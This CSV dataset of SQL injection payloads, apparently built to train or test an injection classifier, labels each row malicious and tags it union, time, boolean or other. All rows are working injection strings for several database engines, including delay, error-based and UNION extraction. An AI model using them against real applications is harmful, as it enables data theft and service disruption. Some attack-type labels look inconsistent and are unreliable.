Query,Label,Attack_Type
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'nbsf' like 'nbsf",1,Other_Malicious
"1 where 2914  =  2914 union all select null,null,null#",1,Union-based
"1"" and 2006  =  2006",1,Boolean-based
1'+  (  select biqo where 6046  =  6046,1,Other_Malicious
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,1,Other_Malicious
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'vwve' like 'vwve,1,Time-based
1 rlike sleep  (  5  )  # urxh,1,Time-based
"1'+  (  select ummn where 8883  =  8883 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +'",1,Other_Malicious
"1'   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,Other_Malicious
"-9837"" where 7201  =  7201 union all select 7201,7201,7201--",1,Union-based
"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""jebr"" like ""jebr",1,Other_Malicious
"-5344"" union all select 9482,9482,9482,9482,9482,9482,9482,9482,9482--",1,Union-based
-8069'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'qbvz'  =  'qbvz,1,Other_Malicious
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""%""  =  """,1,Time-based
"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho",1,Other_Malicious
"1%'   )    )    union all select null,null,null--",1,Union-based
-3998'   )    )    or 3038  =  3038,1,Boolean-based
"-2862'   )    )     )   union all select 6649,6649--",1,Union-based
"1   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   3003  =  3003",1,Other_Malicious
"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,Other_Malicious
 (  select   (  case when   (  6986  =  6986  )   then 6986 else 6986*  (  select 6986 from mysql.db  )   end   )    ) ,1,Other_Malicious
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",1,Other_Malicious
"-9583'   )    )    union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",1,Union-based
1%'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  '%'  =  ',1,Other_Malicious
1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,Time-based
"-5391 or make_set  (  9354  =  9354,7185  )  # ptyy",1,Other_Malicious
"-5322"" union all select 6494,6494,6494,6494,6494,6494--",1,Union-based
select sleep  (  5  )   and    (    (     (  8354  =  8354,1,Time-based
"1 and elt  (  4249  =  4249,7259  )  -- meef",1,Other_Malicious
1' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  #,1,Time-based
"1""  )   as ypfa where 6128  =  6128",1,Other_Malicious
1'+  (  select plhk where 6540  =  6540,1,Other_Malicious
"-3102  )   union all select 6707,6707,6707,6707--",1,Union-based
"1 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # dwxl",1,Other_Malicious
"-9634'   )    )     )   union all select 4141,4141#",1,Union-based
"-5640""   )    )    or 9792  =  2728--",1,Boolean-based
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ctac' like 'ctac",1,Other_Malicious
-5764 or 3038  =  3038,1,Boolean-based
select   (  case when   (  4996  =  1734  )   then 1 else 4996*  (  select 4996 from master..sysdatabases  )   end  )  --,1,Other_Malicious
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""snwx"" like ""snwx",1,Other_Malicious
1 union all select null--,1,Union-based
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""%""  =  """,1,Other_Malicious
1' where 8159  =  8159 union all select null#,1,Union-based
"1""  )   as uuth where 8555  =  8555 union all select null,null#",1,Union-based
"-6194"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,Other_Malicious
"select * from generate_series  (  3551,3551,case when   (  3551  =  6451  )   then 1 else 0 end  )   limit 1--",1,Other_Malicious
"call regexp_substring  (  repeat  (  right  (  char  (  2385  )  ,0  )  ,500000000  )  ,null  )  --",1,Other_Malicious
-4313%'  )   or 6872  =  6872 and   (  '%'  =  ',1,Boolean-based
1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'eihl'  =  'eihl,1,Time-based
select   (  case when   (  3140  =  4625  )   then 1 else 3140*  (  select 3140 from master..sysdatabases  )   end  )  --,1,Other_Malicious
"-9861' union all select 5710,5710,5710,5710,5710--",1,Union-based
"1 where 8273  =  8273 union all select null,null,null,null,null,null,null,null#",1,Union-based
"1%'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,Time-based
"1""   )    )    as swix where 2459  =  2459 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,Time-based
"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",1,Other_Malicious
1  )   as selm where 5759  =  5759,1,Other_Malicious
"-6112""  )   union all select 8203,8203,8203,8203,8203,8203,8203--",1,Union-based
-8369  )   where 7234  =  7234 order by 1--,1,Other_Malicious
"1' or elt  (  6272  =  6272,sleep  (  5   )    )   ",1,Time-based
"1""   )    )     )   union all select null,null#",1,Union-based
"1   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2997  =  2997",1,Other_Malicious
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,1,Time-based
1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',1,Time-based
"1""   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  ""fcpm""  =  ""fcpm",1,Other_Malicious
1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,Time-based
1'||  (  select 'xemx' from dual where 4683  =  4683 or sleep  (  5  )  #,1,Time-based
select   (  case when   (  4291  =  6937  )   then 4291 else 4291*  (  select 4291 from mysql.db  )   end  )  #,1,Other_Malicious
"1""  )   where 8462  =  8462 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,Other_Malicious
"-1055' union all select 7758,7758,7758,7758,7758,7758--",1,Union-based
"-2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#",1,Union-based
"1' where 8451  =  8451 union all select null,null,null,null,null,null,null,null,null#",1,Union-based
1' where 8635  =  8635 order by 1--,1,Other_Malicious
-8447 where 2850  =  2850 or 7147  =  3262,1,Boolean-based
"1 and elt  (  4249  =  4249,7259  )  ",1,Other_Malicious
"1%'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,Other_Malicious
"1"" where 6179  =  6179",1,Other_Malicious
1'  )   where 6842  =  6842,1,Other_Malicious
"1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,Other_Malicious
-3937   )    )    or 3038  =  3038,1,Boolean-based
"1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",1,Other_Malicious
1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',1,Time-based
1'  )   as cdrm where 4595  =  4595 order by 1#,1,Other_Malicious
"1""   )    )    as zbfj where 2285  =  2285",1,Other_Malicious
"1'  )   where 4407  =  4407 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,Other_Malicious
1 and 4595  =  4595#,1,Boolean-based
-9429'  )   order by 1--,1,Other_Malicious
1%'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',1,Other_Malicious
"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""alkz""  =  ""alkz",1,Time-based
select   (  case when   (  5152  =  7853  )   then 5152 else 5152*  (  select 5152 from mysql.db  )   end  )  #,1,Other_Malicious
"1%"" union all select null,null,null,null,null,null#",1,Union-based
"1 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,Other_Malicious
"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'peyy'  =  'peyy",1,Other_Malicious
"1  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,Time-based
"1  )   as zmjm where 9125  =  9125 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1,Other_Malicious
"-7802'   )    )     )   or elt  (  8778  =  9974,9974  )   and    (    (     (  'glsq' like 'glsq",1,Other_Malicious
1 or sleep  (  5  )  #,1,Time-based
"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",1,Time-based
"1   )    )    as myyh where 5116  =  5116 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,Other_Malicious
"1',  (  select   (  case when   (  4209  =  5879  )   then 1 else 4209*  (  select 4209 from information_schema.character_sets  )   end   )    )   ",1,Other_Malicious
1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'gzpx'  =  'gzpx,1,Other_Malicious
"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'bzgs' like 'bzgs",1,Other_Malicious
"-2314""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""uatq"" like ""uatq",1,Other_Malicious
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw",1,Time-based
"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,Other_Malicious
"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",1,Union-based
"-6184""   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""rovr""  =  ""rovr",1,Other_Malicious
select   (  case when   (  6002  =  9048  )   then 6002 else 6002*  (  select 6002 from mysql.db  )   end  )  #,1,Other_Malicious
1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,1,Time-based
"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""pwwb"" like ""pwwb",1,Time-based
"1%'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  '%'  =  '",1,Other_Malicious
"1""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""llgb"" like ""llgb",1,Other_Malicious
"-5202 union all select 5332,5332,5332,5332,5332,5332,5332#",1,Union-based
"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""btht""  =  ""btht",1,Time-based
"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",1,Union-based
"1' in boolean mode  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #",1,Other_Malicious
1   )    )    union all select null#,1,Union-based
"-4955%' union all select 5928,5928--",1,Union-based
"1' and elt  (  2266  =  7467,7467  )  ",1,Other_Malicious
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'mepp'  =  'mepp,1,Time-based
"1,  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",1,Other_Malicious
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'tmbs'  =  'tmbs",1,Time-based
-4901  )   or 3407  =  6442#,1,Boolean-based
1' where 4134  =  4134 and 1102  =  6300--,1,Boolean-based
"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'hllf'  =  'hllf",1,Other_Malicious
"-1598""   )    )    or elt  (  5329  =  9628,9628  )   and    (    (   ""hyxq"" like ""hyxq",1,Other_Malicious
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   +',1,Time-based
"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1,Time-based
"-3604'  )   as fyev where 7259  =  7259 union all select 7259,7259,7259,7259--",1,Union-based
-6433%'   )    )    or 9323  =  9323#,1,Boolean-based
-8836%'  )   or 4856  =  3891,1,Boolean-based
"1 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,Other_Malicious
"1%'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   '%'  =  '",1,Other_Malicious
 (  7098  =  7098 and sleep  (  5   )    ) ,1,Time-based
"1""  )   as jiyl where 4893  =  4893 union all select null,null,null,null,null#",1,Union-based
-3243 or 2266  =  3583#,1,Boolean-based
"1'  )   union all select null,null,null,null,null--",1,Union-based
"1%""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,1,Other_Malicious
"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'pphf'  =  'pphf",1,Other_Malicious
"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""bxct"" like ""bxct",1,Time-based
-9120'   )    )    or 8571  =  8571--,1,Boolean-based
1'+  (  select naiw where 4924  =  4924,1,Other_Malicious
-9389'  )   or 8859  =  3989--,1,Boolean-based
"-9923%'   )    )     )   union all select 8985,8985,8985,8985,8985,8985,8985#",1,Union-based
1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'hbwk' like 'hbwk,1,Other_Malicious
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""tgdu""  =  ""tgdu",1,Other_Malicious
"-1510'   )    )     )   union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1,Union-based
"1""  )   union all select null,null,null,null,null,null,null#",1,Union-based
"elt  (  8192  =  8192,sleep  (  5   )    )   ",1,Time-based
end and    (    (   'zeyr'  =  'zeyr,1,Other_Malicious
"1""   )    )    as luon where 4676  =  4676 rlike sleep  (  5  )  #",1,Time-based
"1""  )   where 6138  =  6138 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,Time-based
"1"" where 3740  =  3740 rlike sleep  (  5  )  #",1,Time-based
"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt",1,Other_Malicious
1  )   as tngy where 8956  =  8956 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,Other_Malicious
"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",1,Union-based
-3540 where 7302  =  7302 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,Other_Malicious
"1  )   as lfra where 2669  =  2669 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,Other_Malicious
1'  )   rlike sleep  (  5  )   and   (  'qsub' like 'qsub,1,Time-based
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",1,Union-based
"1'+  (  select 'uzaw' where 9900  =  9900 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",1,Other_Malicious
"1""  )   as dlfq where 8410  =  8410",1,Other_Malicious
"1  )   as guru where 7615  =  7615 union all select null,null,null,null,null,null,null,null,null,null#",1,Union-based
"1  )   and make_set  (  1559  =  4863,4863  )  ",1,Other_Malicious
-9484' or   (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa,1,Other_Malicious
"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,Other_Malicious
"1"" where 5328  =  5328 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,Time-based
"1""   )    )     )   union all select null,null,null,null,null,null,null#",1,Union-based
1'  )   as ihsc where 3978  =  3978,1,Other_Malicious
"-6125'||  (  select 'hwnm' where 1428  =  1428 union all select 1428,1428,1428,1428,1428,1428#",1,Union-based
select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,Other_Malicious
1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,1,Time-based
"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'pbtf'  =  'pbtf",1,Union-based
"1'  )   where 7391  =  7391 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,Other_Malicious
1'+  (  select dklj where 3265  =  3265,1,Other_Malicious
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,Other_Malicious
"1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cbwx'  =  'cbwx",1,Other_Malicious
-3422%'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',1,Other_Malicious
select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,1,Time-based
"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  -- fwzl",1,Union-based
-3083  )   or 5221  =  7829,1,Boolean-based
"1'   )    )    union all select null,null,null--",1,Union-based
"1""  )   as vcvw where 2445  =  2445 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,Time-based
waitfor delay '0:0:5' and    (    (     (  'ozjl' like 'ozjl,1,Time-based
"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",1,Other_Malicious
"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'yzdp'  =  'yzdp",1,Other_Malicious
"-3411'   )    )     )   union all select 3185,3185,3185,3185,3185,3185,3185,3185--",1,Union-based
"-6254"" where 8941  =  8941 or elt  (  1032  =  1032,3623  )  --",1,Other_Malicious
"1' and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,Other_Malicious
1   )    )     )   order by 1#,1,Other_Malicious
"-5027%""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,1,Other_Malicious
select   (  case when   (  4006  =  1276  )   then 1 else 4006*  (  select 4006 from master..sysdatabases  )   end  )  --,1,Other_Malicious
"1'+  (  select 'tzey' where 4491  =  4491 union all select null,null,null,null,null,null,null,null--",1,Union-based
"select count  (  *  )   from generate_series  (  1,5000000  )  # fnck",1,Other_Malicious
1 order by 1#,1,Other_Malicious
1   )    )    as xbii where 2262  =  2262 or sleep  (  5  )  --,1,Time-based
-9340  )   where 5462  =  5462 or 3038  =  3038,1,Boolean-based
1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,1,Time-based
"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",1,Union-based
1   )    )    and   (  4169  =  9887  )  *9887 and    (    (   1137  =  1137,1,Other_Malicious
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu",1,Other_Malicious
1  )   where 6472  =  6472,1,Other_Malicious
"1%""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""%""  =  """,1,Union-based
-4595'  )   where 4892  =  4892 order by 1--,1,Other_Malicious
"1   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   8294  =  8294",1,Union-based
"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'sxgl'  =  'sxgl",1,Other_Malicious
1'   )    )    as xirr where 2425  =  2425,1,Other_Malicious
"1'   )    )    union all select null,null,null,null,null,null,null,null--",1,Union-based
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,Time-based
